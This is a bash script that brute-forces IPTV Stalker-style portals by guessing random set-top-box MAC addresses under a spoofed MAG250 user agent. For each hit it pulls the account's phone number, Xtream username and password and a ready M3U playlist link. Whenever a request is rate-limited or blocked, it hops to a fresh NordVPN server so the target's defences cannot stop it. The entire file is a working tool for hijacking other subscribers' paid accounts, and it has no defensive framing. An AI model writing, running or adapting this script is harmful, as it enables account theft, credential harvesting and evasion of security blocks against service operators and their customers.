#!/bin/bash

URL="${1%/}"

if [ -z "$URL" ]; then
    echo "Usage: $0 <portal-url>"
    exit 1
fi

GREEN=$'\033[0;32m'
RED=$'\033[0;31m'
YELLOW=$'\033[0;33m'
LIGHT_BLUE=$'\033[0;94m'
RESET=$'\033[0m'
CLEAR_LINE=$'\033[2K'

UA="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
# 1s per-request timeout: a blocked/ratelimited (WAF) IP is detected as fast
# as possible — curl returns 000 on timeout — so we can hop to a fresh VPN
# server without stalling the workers.
SCAN_TIMEOUT=1

# ---------------------------------------------------------------------------
# NordVPN: every request goes through an active tunnel. On a blocked or
# ratelimited IP (non-200 handshake) we hop to a fresh server (any region)
# immediately — no waiting. Hops are serialized via flock so parallel workers
# can't stack nordvpn connect calls on each other.
# ---------------------------------------------------------------------------
if ! command -v nordvpn >/dev/null 2>&1; then
  echo "${RED}nordvpn CLI not found (the 'nordvpn' CLI must be installed).${RESET}"
  exit 1
fi
VPN_LOCK=$(mktemp)      # serializes a hop across all workers
VPN_GEN=$(mktemp)       # index of the country currently up
echo 0 > "$VPN_GEN"
mapfile -t VPN_COUNTRIES < <(nordvpn countries 2>/dev/null | grep -v '^[[:space:]]*$')
[ ${#VPN_COUNTRIES[@]} -gt 0 ] || VPN_COUNTRIES=(Germany Netherlands France Canada Japan United_States)

vpn_connected() { nordvpn status 2>/dev/null | grep -q '^Status: Connected'; }

# Ensure a tunnel is up before any scanning starts.
ensure_vpn() {
  vpn_connected && { echo 0 > "$VPN_GEN"; return 0; }
  progress "${YELLOW}Connecting NordVPN…${RESET}"
  local n=0
  while (( n < 5 )); do
    nordvpn connect "${VPN_COUNTRIES[0]}" >/dev/null 2>&1
    vpn_connected && { echo 0 > "$VPN_GEN"; return 0; }
    sleep 1; n=$(( n + 1 ))
  done
  vpn_connected || progress "${RED}Warning: no active VPN tunnel yet${RESET}"
}

# Hop to a different server (fresh IP) right away. Serialized via VPN_LOCK so
# parallel workers don't stack nordvpn connect calls on each other.
vpn_switch() {
  (
    flock -x 9
    len=${#VPN_COUNTRIES[@]}
    i=$(( ($( <"$VPN_GEN") + 1) % len ))
    ok=0; tries=0
    while (( tries < len )); do
      country=${VPN_COUNTRIES[i]}
      nordvpn connect "$country" >/dev/null 2>&1
      if vpn_connected; then echo "$i" > "$VPN_GEN"; ok=1; break; fi
      i=$(( (i + 1) % len )); tries=$(( tries + 1 ))
    done
    if (( ok )); then
      progress "scanning: [${YELLOW}blocked → new VPN: ${country}${RESET}]"
    else
      progress "scanning: [${RED}blocked, VPN reconnecting…${RESET}]"
    fi
  ) 9>"$VPN_LOCK"
}

read -rp "${YELLOW}How many MACs do you want to find? ${RESET}" max_success_count
read -rp "${YELLOW}Parallel workers? [10] ${RESET}" num_workers
num_workers=${num_workers:-10}

success_file=$(mktemp)
echo "0" > "$success_file"
hit_file=$(mktemp)
retry_file=$(mktemp)   # MACs blocked on the previous VPN endpoint, retried
                        # as soon as a fresh one is up


hex=(0 1 2 3 4 5 6 7 8 9 A B C D E F)

# Serialized in-place line update: CR + clear-line + message, locked so
# concurrent workers can't interleave ESC sequences mid-line.
progress() {
  {
    flock -x 200
    printf '\r%s%s' "$CLEAR_LINE" "$1"
  } 200>"$success_file.lock"
}

# Retry queue: a MAC whose handshake failed on the current VPN endpoint is
# parked here and retried once a fresh endpoint is up (so a geo-blocked MAC
# gets a fair second chance on a new source IP). Serialized via flock.
retry_take() {
  local mac
  mac=$(
    exec 201>"$retry_file.lock"
    flock -x 201
    head -n1 "$retry_file" 2>/dev/null
  )
  if [[ -n $mac ]]; then
    (
      exec 201>"$retry_file.lock"
      flock -x 201
      sed -i "0,/^${mac}\$/d" "$retry_file"
    )
  fi
  printf '%s' "$mac"
}

retry_store() {
  (
    exec 201>"$retry_file.lock"
    flock -x 201
    printf '%s\n' "$1" >> "$retry_file"
    # cap the queue so a persistently-blocked portal can't grow it unbounded
    if (( $(wc -l < "$retry_file") > 200 )); then
      sed -i '1d' "$retry_file"
    fi
  )
}

scan_mac() {
  token_pat='"token":"'
  while true; do
    read -r current_count < "$success_file"
    ((current_count >= max_success_count)) && break

    # Prefer a MAC parked from a previous (blocked) endpoint before generating
    # a fresh random one, so a geo-blocked MAC gets retried on the new IP.
    MAC=$(retry_take)
    [[ -z $MAC ]] && MAC="00:1A:79:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}:${hex[RANDOM%16]}${hex[RANDOM%16]}"
    cookie="mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;"

    response=$(curl -s -i --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      "$URL/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml")
    # 000 / non-200 handshake (blocked, ratelimited, ...): park this MAC for
    # retry, hop to a fresh VPN server for a new source IP, then move on.
    if [[ $response != *"200"* ]]; then
      progress "scanning: $MAC [${RED}connection failed, ratelimited?${RESET}]"
      retry_store "$MAC"
      vpn_switch
      continue
    fi

    token=""
    if [[ $response == *"$token_pat"* ]]; then
      token=${response#*"$token_pat"}
      token=${token%%'"'*}
    fi

    curl -s -o /dev/null --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=stb&action=get_profile&auth_second_step=1&hw_version_2=1635b1c3e68859923ab3bb72192e089f66e7dd9e&JsHttpRequest=1-xml"

    if ! curl -s --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml" \
      | jq -e '.js[] | select(.title == "All")' > /dev/null 2>&1; then
      progress "scanning: $MAC [connected but no subscriptions.]"
      continue
    fi

    mac_phone=$(curl -s --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml" \
      | jq -r '.js | "\(.mac) [\(.phone)]"')

    ffplay=$(curl -s --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=itv&action=create_link&cmd=$channel&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml" \
      | jq -r 'try .js.cmd // .js[0].cmd // empty' 2>/dev/null)
    ffplay=${ffplay#ffmpeg }

    # http://host/user/pass/... -> user=$4, pass=$5 when split on "/"
    IFS=/ read -r _ _ _ xtreamuser xtreampw _ <<< "$ffplay"

    read -r exp_date max_connections active_cons <<< \
      "$(curl -s --max-time $SCAN_TIMEOUT "$URL/player_api.php?username=$xtreamuser&password=$xtreampw" \
        | jq -r '[.user_info | .exp_date, .max_connections, .active_cons] | join(" ")')"

    live=$(curl -s --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=itv&action=get_ordered_list&genre=*&fav=0&sortby=name&p=1&JsHttpRequest=1-xml" \
      | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)

    vod=$(curl -s --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=vod&action=get_ordered_list&category=*&sortby=added&fav=0&p=1&JsHttpRequest=1-xml" \
      | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)

    series=$(curl -s --max-time $SCAN_TIMEOUT \
      -H "User-Agent: $UA" \
      -H "Cookie: $cookie" \
      -H "Authorization: Bearer $token" \
      "$URL/portal.php?type=series&action=get_ordered_list&category=*&sortby=added&fav=0&p=1&JsHttpRequest=1-xml" \
      | jq -r 'try (.js.total_items // .js[0].total_items) // 0' 2>/dev/null)

    {
      flock -x 200
      printf '\r%sfound:    %s%s%s\n' "$CLEAR_LINE" "$GREEN" "$mac_phone" "$RESET"
      [ -n "$exp_date" ] && [ "$exp_date" != "null" ] && \
        printf '%s  -> %s/get.php?username=%s&password=%s&type=m3u_plus [max=%s active=%s]%s\n' \
          "$LIGHT_BLUE" "$URL" "$xtreamuser" "$xtreampw" "$max_connections" "$active_cons" "$RESET"
      printf "%s|%s|%s|%s\n" "$MAC" "$live" "$vod" "$series" >> "$hit_file"
      # Increment under the lock: a read-modify-write outside the lock
      # loses increments when two workers race on the same value.
      read -r current_count < "$success_file"
      echo $((current_count + 1)) > "$success_file"
    } 200>"$success_file.lock"

    ((current_count + 1 >= max_success_count)) && { printf '%sTarget reached: %s MACs found.%s\n' "$LIGHT_BLUE" "$max_success_count" "$RESET"; break; }
  done
}

pids=()
trap 'kill "${pids[@]}" 2>/dev/null; wait "${pids[@]}" 2>/dev/null; show_summary; exit 1' INT TERM

# Never scan without an active tunnel.
ensure_vpn

for ((i=0; i<num_workers; i++)); do
  scan_mac &
  pids+=($!)
done

show_summary() {
  printf '\r%s' "$CLEAR_LINE"
  if [ -s "$hit_file" ]; then
    printf '\n%sSummary (sorted by total content):%s\n' "$LIGHT_BLUE" "$RESET"
    awk -F'|' '{print $2+$3+$4, $0}' "$hit_file" | sort -rn | cut -d' ' -f2- | while IFS='|' read -r mac live vod series; do
      printf '%s  %s%s%s  Live TV: %s  VOD: %s  Series: %s%s\n' "$LIGHT_BLUE" "$GREEN" "$mac" "$LIGHT_BLUE" "$live" "$vod" "$series" "$RESET"
    done
  fi
  rm -f "$success_file" "$success_file.lock" "$hit_file" "$VPN_LOCK" "$VPN_GEN" "$retry_file" "$retry_file.lock"
}

wait
show_summary
